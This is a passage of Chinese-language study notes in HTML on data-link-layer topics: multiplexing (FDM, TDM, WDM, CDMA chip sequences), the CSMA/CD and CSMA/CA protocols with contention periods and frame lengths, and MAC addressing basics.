静态划分信道</h3><p>预先固定分配好信道，这类方法非常不灵活，对于突发性数据传输信道利用率会很低。通常在无线网络的物理层中使用，而不是在数据链路层中使用。</p><p>复用是通信技术中的一个重要概念，复用就是通过一条物理线路同时传输多路用户的信号。当网络中传输媒体的传输容量大于多条单一信道的总通信量时，就可以利用复用技术在一条物理线路上建立多条通信信道来充分利用传输媒体的带宽。</p><p>常用的复用技术有4种：频分复用FDM、时分复用TDM、波分复用WDM、码分复用CDM。</p><h4 id="3-7-2-1-频分复用FDM"><a href="#3-7-2-1-频分复用FDM" class="headerlink" title="3.7.2.1 频分复用FDM"></a>3.7.2.1 频分复用FDM</h4><p>频分复用FDM：将整个带宽分为多份，用户在分配到一定的频带后，在通信过程中自始至终都占用这个频带。</p><p>频分复用的所有用户在同样的时间占用不同的带宽资源（注意，这里的“带宽”是频率带宽而不是数据的发送速率）。</p><p>接收端通过相应的分用器通过滤波将各路信号分开。将合成的复用信号恢复成原始的多路信号。</p><img src="/posts/e255a10a/3.5.4.2.1.png" class="" title="频分复用FDM"><h4 id="3-7-2-2-时分复用TDM"><a href="#3-7-2-2-时分复用TDM" class="headerlink" title="3.7.2.2 时分复用TDM"></a>3.7.2.2 时分复用TDM</h4><ul><li>将时间划分成一个个的时间间隙。</li><li>时分复用技术将传输线路的带宽资源按一个个的时间间隙轮流分配给不同的用户。</li><li>每个用户只在所分配的时隙里使用线路传输数据。</li></ul><img src="/posts/e255a10a/3.5.4.2.2.png" class="" title="时分复用TDM"><ul><li>时分复用是将时间划分为一段段等长的时分复用帧（TDM帧）。每一个时分复用的用户在每一个 TDM 帧中占用固定序号的时隙。</li><li>每一个用户所占用的时隙是周期性地出现（其周期就是TDM帧的长度）的。</li><li>TDM 信号也称为等时 (isochronous) 信号。</li><li>时分复用的所有用户在不同的时间占用同样的频带宽度。</li></ul><h4 id="3-7-2-3-波分复用WDM"><a href="#3-7-2-3-波分复用WDM" class="headerlink" title="3.7.2.3 波分复用WDM"></a>3.7.2.3 波分复用WDM</h4><p>波分复用就是光的频分复用。</p><p>光信号传输一段距离后会衰减，所以要用掺铒光纤放大器放大光信号。</p><img src="/posts/e255a10a/3.5.4.2.3.png" class="" title="波分复用WDM"><h4 id="3-7-2-4-码分复用CDM"><a href="#3-7-2-4-码分复用CDM" class="headerlink" title="3.7.2.4 码分复用CDM"></a>3.7.2.4 码分复用CDM</h4><p>码分复用，由于该技术主要用于多址接入，人们更常用的名词时码分多址CDMA（Code Division Multiple Access）</p><p>同理：频分复用（FDM）和时分复用（TDM）都可用于多址接入，相应的名词是频分多址（FDMA）和时分多址（TMDA）。</p><p>复用和多址的区别：</p><img src="/posts/e255a10a/3.5.4.2.4.png" class="" title="复用和多址的区别"><p>与FDM和TDM不同，CDM的每一个用户可以在同样的时间使用同样的频带进行通信。</p><p>由于各用户经过特殊挑选的不同码型，因此个用户之间不会造成干扰。</p><p>CDM最初是用于军事通信的，因此这种系统发送的信号有很强的抗干扰能力，其频谱类似于白噪声，不易于被敌人发现。随着技术的进步，CDMA设备的价格和体积都大幅度下降，因为现在已广泛用于民用的移动通信中。</p><p>在CDMA中，每一个比特时间再划分为m个短的间隔，称为码片(Chip)。通常m=64或128。为了简单起见，在后续的举例中，假设m为8。(注意：1个比特时间是指发送1个比特所花费的时间)</p><p>使用CDMA的每一个站被指派一个唯一的m bit码片序列(Chip Sequence)。</p><ul><li>一个站如果要发送比特1，则发送它自己的m bit码片序列</li><li>一个站如果要发送比特0，则发送它自己的m bit码片序列的二进制反码</li></ul><img src="/posts/e255a10a/3.5.4.2.5.png" class="" title="码片举例"><p>这种通信方式称为序列扩频DSSS。</p><p>码片序列的挑选原则如下:</p><ul><li><p>分配给每个站的码片序列必须各不相同，实际常采用伪随机码序列。</p></li><li><p>分配给每个站的码片序列必须相互正交(规格化内积为0)。</p><p>令向量 S 表示站 S 的码片序列，令向量 T 表示其他任何站的码片序列</p><p>两个不同站 S 和 T 的码片序列正交，就是向量 S 和 T 的规格化内积为 0</p><script type="math/tex; mode=display">S·T\equiv\frac 1m\sum_{i=1}^mS_iT_i=0\\S·\overline T\equiv\frac1m\sum_{i=1}^mS_i\overline T_i=0\\S·S\equiv\frac1m\sum_{i=1}^mS_iS_i=\frac1m\sum_{i=1}^mS_i^2=\frac1m\sum_{i=1}^m(±1)^2=1\\S·\overline S\equiv\frac1m\sum_{i=1}^mS_i\overline S_i=-1</script></li></ul><img src="/posts/e255a10a/3.5.4.2.6.png" class="" title="习题1"><img src="/posts/e255a10a/3.5.4.2.7.png" class="" title="习题2"><img src="/posts/e255a10a/3.5.4.2.8.png" class="" title="习题2"><img src="/posts/e255a10a/3.5.4.2.9.png" class="" title="习题3"><h3 id="3-7-3-动态接入控制"><a href="#3-7-3-动态接入控制" class="headerlink" title="3.7.3 动态接入控制"></a>3.7.3 动态接入控制</h3><p>对于动态接入控制，我们主要关注随机接入。</p><p>最初的以太网是将许多计算机都连接到一根总线上。易于实现广播通信。当初认为这样的连接方法既简单又可靠，因为总线上没有源器件。</p><img src="/posts/e255a10a/3.5.4.3.1.png" class="" title="碰撞"><p>但是在多个主机共用一个总线时，避免不了会出现碰撞的问题。如何协调总线各个主机的工作，尽量避免碰撞是一个必须解决的重要问题。因此就出现了载波监听多址接入/碰撞检测 CSMA/CD协议，用于解决碰撞问题。</p><p>随机接入分为总线型局域网和无线型局域网。总线型局域网使用的是CSMA/CD协议。无线型局域网使用的是CSMA/CA协议。</p><h4 id="3-7-3-1-CSMA-CD协议"><a href="#3-7-3-1-CSMA-CD协议" class="headerlink" title="3.7.3.1 CSMA/CD协议"></a>3.7.3.1 CSMA/CD协议</h4><p>载波监听多址接入/碰撞检测(CSMA/CD，Carrier Sense Multiple Access/Collision Detection)</p><ol><li><p>多址接入(MA)：多个站连接在一条总线上，竞争使用总线</p></li><li><p>载波监听(CS)：每一个站在发送帧之前先要检测一下总线上是否有其它站点在发送帧（“先听后说”）</p><ul><li>若检测到总线空闲 96 比特时间，则发送这个帧</li><li>若检测到总线忙，则继续检测并等待总线转为空闲 96 比特时间，然后发送这个帧</li></ul><p>其中，96比特时间是发送96比特需要的时间(帧间最小间隔)，其作用是可以检测出一个帧的结束。</p><img src="/posts/e255a10a/3.5.4.3.2.png" class="" title="载波监听"><p>但是实际上，总线上并没有什么“载波”。因此， “载波监听”就是用电子技术检测总线上有没有其它计算机发送的数据信号。</p></li><li><p>碰撞检测(CD)：每一个正在发送帧的站边发送边检测碰撞（“边说边听”）</p><ul><li>一旦发现总线上出现碰撞，则立即停止发送，退避一段随机时间后再次发送(“一旦冲突，立即停说，等待时机，重新再说”)</li></ul><img src="/posts/e255a10a/3.5.4.3.3.png" class="" title="碰撞检测"><p>“碰撞检测”就是计算机边发送数据边检测信道上的信号电压大小。当几个站同时在总线上发送数据时，总线上的信号电压摆动值将会增大(互相叠加)。当一个站检测到的信号电压摆动值超过一定的门限值时，就认为总线上至少有两个站同时在发送数据，表明产生了碰撞。所谓“碰撞”就是发生了冲突。因此碰撞检测也称冲突检测。在发生碰撞时，总线上传输的信号产生了严重的失真，无法从中恢复出有用的信息来。</p></li></ol><p><strong>争用期(碰撞窗口)</strong></p><ul><li><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.029ex" xmlns="http://www.w3.org/2000/svg" width="1.17ex" height="1.005ex" role="img" focusable="false" viewBox="0 -431 517 444"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D70F" d="M39 284Q18 284 18 294Q18 301 45 338T99 398Q134 425 164 429Q170 431 332 431Q492 431 497 429Q517 424 517 402Q517 388 508 376T485 360Q479 358 389 358T299 356Q298 355 283 274T251 109T233 20Q228 5 215 -4T186 -13Q153 -13 153 20V30L203 192Q214 228 227 272T248 336L254 357Q254 358 208 358Q206 358 197 358T183 359Q105 359 61 295Q56 287 53 286T39 284Z"></path></g></g></g></svg></mjx-container>：以太网单程端到端传播时延。</li><li><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.023ex" xmlns="http://www.w3.org/2000/svg" width="1.005ex" height="1.645ex" role="img" focusable="false" viewBox="0 -717 444 727"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D6FF" d="M195 609Q195 656 227 686T302 717Q319 716 351 709T407 697T433 690Q451 682 451 662Q451 644 438 628T403 612Q382 612 348 641T288 671T249 657T235 628Q235 584 334 463Q401 379 401 292Q401 169 340 80T205 -10H198Q127 -10 83 36T36 153Q36 286 151 382Q191 413 252 434Q252 435 245 449T230 481T214 521T201 566T195 609ZM112 130Q112 83 136 55T204 27Q233 27 256 51T291 111T309 178T316 232Q316 267 309 298T295 344T269 400L259 396Q215 381 183 342T137 256T118 179T112 130Z"></path></g></g></g></svg></mjx-container>：站发送数据到站检测到碰撞所经历的一段时间。</li><li><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="0.817ex" height="1.441ex" role="img" focusable="false" viewBox="0 -626 361 637"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g></g></g></svg></mjx-container>：纵轴向下，时间的正向进行。</li><li>电磁波在 1km 电缆传播时延约等于 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.489ex" xmlns="http://www.w3.org/2000/svg" width="2.495ex" height="1.995ex" role="img" focusable="false" viewBox="0 -666 1103 882"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g><g data-mml-node="mi" transform="translate(500,0)"><path data-c="1D707" d="M58 -216Q44 -216 34 -208T23 -186Q23 -176 96 116T173 414Q186 442 219 442Q231 441 239 435T249 423T251 413Q251 401 220 279T187 142Q185 131 185 107V99Q185 26 252 26Q261 26 270 27T287 31T302 38T315 45T327 55T338 65T348 77T356 88T365 100L372 110L408 253Q444 395 448 404Q461 431 491 431Q504 431 512 424T523 412T525 402L449 84Q448 79 448 68Q448 43 455 35T476 26Q485 27 496 35Q517 55 537 131Q543 151 547 152Q549 153 557 153H561Q580 153 580 144Q580 138 575 117T555 63T523 13Q510 0 491 -8Q483 -10 467 -10Q446 -10 429 -4T402 11T385 29T376 44T374 51L368 45Q362 39 350 30T324 12T288 -4T246 -11Q199 -11 153 12L129 -85Q108 -167 104 -180T92 -202Q76 -216 58 -216Z"></path></g></g></g></svg></mjx-container>s</li></ul><img src="/posts/e255a10a/3.5.4.3.4.png" class="" title="碰撞窗口"><p>由图可以看出，当发生碰撞时，最长需要<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.029ex" xmlns="http://www.w3.org/2000/svg" width="2.301ex" height="1.536ex" role="img" focusable="false" viewBox="0 -666 1017 679"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(500,0)"><path data-c="1D70F" d="M39 284Q18 284 18 294Q18 301 45 338T99 398Q134 425 164 429Q170 431 332 431Q492 431 497 429Q517 424 517 402Q517 388 508 376T485 360Q479 358 389 358T299 356Q298 355 283 274T251 109T233 20Q228 5 215 -4T186 -13Q153 -13 153 20V30L203 192Q214 228 227 272T248 336L254 357Q254 358 208 358Q206 358 197 358T183 359Q105 359 61 295Q56 287 53 286T39 284Z"></path></g></g></g></svg></mjx-container>的时间就能检测到本次是否发生碰撞（也就是碰撞点在最远端）。因此，以太网中，端到端的往返传播时延<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.029ex" xmlns="http://www.w3.org/2000/svg" width="2.301ex" height="1.536ex" role="img" focusable="false" viewBox="0 -666 1017 679"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(500,0)"><path data-c="1D70F" d="M39 284Q18 284 18 294Q18 301 45 338T99 398Q134 425 164 429Q170 431 332 431Q492 431 497 429Q517 424 517 402Q517 388 508 376T485 360Q479 358 389 358T299 356Q298 355 283 274T251 109T233 20Q228 5 215 -4T186 -13Q153 -13 153 20V30L203 192Q214 228 227 272T248 336L254 357Q254 358 208 358Q206 358 197 358T183 359Q105 359 61 295Q56 287 53 286T39 284Z"></path></g></g></g></svg></mjx-container>称为争用期或碰撞窗口。也就是说在这段时间才有可能发生碰撞，若这段时间没有发生碰撞，则不再会发生碰撞。</p><p>每一个主机在自己发送帧之后的一小段时间内，存在着遭遇碰撞的可能性。这一小段时间是不确定的。它取决于另一个发送帧的主机到本主机的距离，但不会超过总线的端到端往返传播时延，即一个争用期时间。</p><p>显然，在以太网中发送帧的主机越多，端到端往返传播时延越大，发生碰撞的概率就越大。因此，共享式以太网不能连接太多的主机，使用的总线也不能太长。</p><ul><li>10Mb/s以太网把争用期定为 512 比特发送时间，即<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.489ex" xmlns="http://www.w3.org/2000/svg" width="6.448ex" height="1.995ex" role="img" focusable="false" viewBox="0 -666 2850 882"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(500,0)"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(1000,0)"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(1278,0)"></path></g><g data-mml-node="mi" transform="translate(1778,0)"><path data-c="1D707" d="M58 -216Q44 -216 34 -208T23 -186Q23 -176 96 116T173 414Q186 442 219 442Q231 441 239 435T249 423T251 413Q251 401 220 279T187 142Q185 131 185 107V99Q185 26 252 26Q261 26 270 27T287 31T302 38T315 45T327 55T338 65T348 77T356 88T365 100L372 110L408 253Q444 395 448 404Q461 431 491 431Q504 431 512 424T523 412T525 402L449 84Q448 79 448 68Q448 43 455 35T476 26Q485 27 496 35Q517 55 537 131Q543 151 547 152Q549 153 557 153H561Q580 153 580 144Q580 138 575 117T555 63T523 13Q510 0 491 -8Q483 -10 467 -10Q446 -10 429 -4T402 11T385 29T376 44T374 51L368 45Q362 39 350 30T324 12T288 -4T246 -11Q199 -11 153 12L129 -85Q108 -167 104 -180T92 -202Q76 -216 58 -216Z"></path></g><g data-mml-node="mi" transform="translate(2381,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g></g></svg></mjx-container>，因此其总线长度不能超过 5120m，但考虑到其他一些因素，如信号衰减等，以太网规定总线长度不能超过 2500m。</li></ul><p><strong>最小帧长</strong></p><img src="/posts/e255a10a/3.5.4.3.5.png" class="" title="最小帧长"><p>A站发送一个帧完毕后，不再针对该帧进行碰撞检测，而这时候C站检测到信道空闲时间 96 bit，发送帧，将产生碰撞。D站收到碰撞过后有差错的帧，将该帧丢弃。A站不知道已发送完毕的帧遭遇碰撞，所以不进行重传。显然，以太网的帧长不能太短！</p><ul><li>以太网规定最小帧长为64字节，即512比特（512比特时间即为争用期）<ul><li>如果要发送的数据非常少，那么必须加入一些填充字节，使帧长不小于64字节。</li></ul></li><li>以太网的最小帧长确保了主机可在帧发送完成之前就检测到该帧的发送过程中是否遭遇了碰撞<ul><li>如果在争用期（共发送64字节）没有检测到碰撞，那么后续发送的数据就一定不会发生碰撞；</li><li>如果在争用期内检测到碰撞，就立即中止发送，这时已经发送出去的数据一定小于64字节，因此凡长度小于64字节的帧都是由于碰撞而异常中止的无效帧。</li></ul></li></ul><p>最小帧长的计算：</p><script type="math/tex; mode=display">最小帧长=争用期×数据传输速率</script><p><strong>最大帧长</strong></p><img src="/posts/e255a10a/3.5.4.3.6.png" class="" title="最大帧长"><p>在此传输情况中，A发送了一个很长的帧，占用了大量时间，造成B、C无法传输数据，并且可能会造成某一端的缓冲区满的情况。因此便提出了最大帧长的概念。</p><p><strong>截断二进制指数退避算法</strong></p><img src="/posts/e255a10a/3.5.4.3.7.png" class="" title="截断二进制指数退避算法"><p><strong>信道利用率</strong></p><p>一般信道利用率：</p><img src="/posts/e255a10a/3.5.4.3.8.png" class="" title="一般信道利用率"><p>极限信道利用率：</p><img src="/posts/e255a10a/3.5.4.3.9.png" class="" title="极限信道利用率"><p>参数a的值尽量小，以提高信道利用率。因此以太网端到端的距离应受到限制，以太网帧的长度应尽量长些。</p><p><strong>帧发送流程</strong></p><img src="/posts/e255a10a/3.5.4.3.10.png" class="" title="帧发送流程"><p><strong>帧接收流程</strong></p><img src="/posts/e255a10a/3.5.4.3.11.png" class="" title="帧接收流程"><p>CSMA/CD协议曾经用于各种总线结构以太网和双绞线以太网的早期版本中，现在的以太网基于交换机和全双工连接，不会有碰撞，因此没有必要使用CSMA/CD协议。</p><img src="/posts/e255a10a/3.5.4.3.12.png" class="" title="习题一"><img src="/posts/e255a10a/3.5.4.3.13.png" class="" title="习题二"><img src="/posts/e255a10a/3.5.4.3.14.png" class="" title="习题二"><img src="/posts/e255a10a/3.5.4.3.15.png" class="" title="习题二"><h4 id="3-7-3-2-CSMA-CA协议"><a href="#3-7-3-2-CSMA-CA协议" class="headerlink" title="3.7.3.2 CSMA/CA协议"></a>3.7.3.2 CSMA/CA协议</h4><p>载波监听多址接入/碰撞避免协议 CSMA/CA(Carrier Sense Multiple Access / Collosion Acoidance)</p><img src="/posts/e255a10a/3.5.4.3.16.png" class="" title="在无线网使用CSMA/CD协议"><img src="/posts/e255a10a/3.5.4.3.17.png" class="" title="在无线网使用CSMA/CD协议"><img src="/posts/e255a10a/3.5.4.3.18.png" class="" title="在无线网使用CSMA/CA协议"><img src="/posts/e255a10a/3.5.4.3.19.png" class="" title="帧间间隔"><p><strong>CSMA/CA协议的工作原理</strong>：</p><img src="/posts/e255a10a/3.5.4.3.20.png" class="" title="CSMA/CA工作原理"><ol><li><p>源站为什么在检测到信道空闲后还要再等待DIFS帧间间隔时间？</p><p>因为要考虑到可能有其它的站有高优先级的帧要发送。若有，就要让高优先级帧先发送。</p></li><li><p>目的站为什么正确接收数据帧后还要等待一段时间SIFS才能发送ACK帧？</p><p>SIFS是最短的帧间间隔，用来分隔属于一次对话的各帧。在这段时间内，一个站点应当能够从发送方式切换到接收方式。</p></li></ol><p>对于发送过程中其他信道检测到信道忙：</p><img src="/posts/e255a10a/3.5.4.3.21.png" class="" title="信道忙状态"><img src="/posts/e255a10a/3.5.4.3.22.png" class="" title="使用退避时间"><img src="/posts/e255a10a/3.5.4.3.23.png" class="" title="退避算法"><img src="/posts/e255a10a/3.5.4.3.24.png" class="" title="退避算法图解"><p><strong>信道预约机制</strong>：为了尽可能减少碰撞的概率和降低碰撞的影响，802.11标准允许要发送数据得站点对信道进行预约。</p><p>对于一次信道预约要进行的过程：</p><ol><li>源站在发送数据帧之前先发送一个短的控制帧，称为请求发送RTS(Request To Send)，它包括源地址、目的地址以及这次通信(包括相应的确认帧)所需的持续时间。</li><li>若目的站正确收到源站发来的RTS帧，且媒体空闲，就发送一个响应控制帧，称为允许发送CTS(Clear To Send)，它也包括这次通信所需的持续时间(从RTS帧中将此持续时间复制到CTS帧中)。</li><li>源站收到CTS帧后，再等待一段时间SIFS后，就可发送其数据帧。</li><li>若目的站正确收到了源站发来的数据帧，在等待时间SIFS后，就向源站发送确认帧ACK。</li></ol><img src="/posts/e255a10a/3.5.4.3.25.png" class="" title="预约过程图解"><img src="/posts/e255a10a/3.5.4.3.26.png" class="" title="预约过程"><p><strong>虚拟载波监听机制</strong>：除RTS帧和CTS帧会携带通信需要持续的时间，数据帧也能携带通信需要持续的时间。</p><img src="/posts/e255a10a/3.5.4.3.27.png" class="" title="虚拟载波监听机制"><p>此时，C知道信道将被占用多长时间，在这段时间内C不能发送帧，即A给B发送数据帧时不会受到C的干扰。</p><img src="/posts/e255a10a/3.5.4.3.28.png" class="" title="习题一"><img src="/posts/e255a10a/3.5.4.3.29.png" class="" title="习题二"><h2 id="3-8-MAC地址、IP地址及ARP协议"><a href="#3-8-MAC地址、IP地址及ARP协议" class="headerlink" title="3.8 MAC地址、IP地址及ARP协议"></a>3.8 MAC地址、IP地址及ARP协议</h2><ul><li>MAC地址是以太网的MAC子层所使用的地址，属于数据链路层。</li><li>IP地址是TCP/IP体系结构网际层所使用的地址。</li><li>ARP协议属于TCP/IP体系结构的网际层，其作用是已知设备所分配到的IP地址，使用ARP协议可以通过该IP地址获取到设备的MAC地址。</li></ul><h3 id="3-8-1-MAC地址"><a href="#3-8-1-MAC地址" class="headerlink" title="3.8.1 MAC地址"></a>3.8.1 MAC地址</h3><p>使用点对点信道的数据链路层不需要使用地址；使用广播信道的数据链路层必须使用地址来区分各主机。</p><img src="/posts/e255a10a/3.8.1.1.png" class="" title="MAC地址"><p>MAC地址一般被固化在网卡(网络适配器)的电可擦可编程只读存储器(EEPROM)中，因此MAC地址也被称为硬件地址。MAC地址有时也被称为物理地址，但这并不意味着MAC地址属于网络体系结构中的物理层。</p><img src="/posts/e255a10a/3.8.1.2.png" class="" title="MAC地址"><p>一般情况下，用户主机会包含两个网络适配器：有线局域网适配器(有线网卡)和无线局域网适配器(无线网卡)。每个网络适配器都有一个全球唯一的MAC地址。而交换机和路由器往往拥有更多的网络接口，所以会拥有更多的MAC地址。综上所述，MAC地址是对网络上各接口的唯一标识，而不是对网络上各设备的唯一标识。</p><img src="/posts/e255a10a/3.8.1.3.png" class="" title="MAC地址格式"><img src="/posts/e255a10a/3.8.1.4.png" class="" title="MAC地址格式"><p>字节发送顺序：第一字节 -&gt; 第六字节</p><p>字节内比特发送顺序：<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.375ex" xmlns="http://www.w3.org/2000/svg" width="1.958ex" height="1.945ex" role="img" focusable="false" viewBox="0 -694 865.6 859.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mn" transform="translate(462,-150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g></g></g></svg></mjx-container> -&gt;  <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.375ex" xmlns="http://www.w3.org/2000/svg" width="1.958ex" height="1.945ex" role="img" focusable="false" viewBox="0 -694 865.6 859.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mn" transform="translate(462,-150) scale(0.707)"><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z"></path></g></g></g></g></svg></mjx-container></p><p><strong>单播MAC地址举例</strong>：</p><ol><li><p>主机B给主机C发送单播帧，主机B首先要构建该单播帧，在帧首部中的目的地址字段填入主机C的MAC地址，源地址字段填入自己的MAC地址，再加上帧首部的其他字段、数据载荷以及帧尾部，就构成了该单播帧。</p></li><li><p>将该帧发送给出去。</p><img src="/posts/e255a10a/3.8.1.9.png" class="" title="单播MAC地址"></li><li><p>此时A接收该单播帧，发现该单播帧的目的MAC地址与自己的MAC地址不匹配，丢弃该帧；C接收该单播帧，发现该单播帧的目的MAC地址与自己的MAC地址匹配，接受该帧，并将该帧交给其上层处理。</p></li></ol><p><strong>广播MAC地址举例</strong>：</p><img src="/posts/e255a10a/3.8.1.10.png" class="" 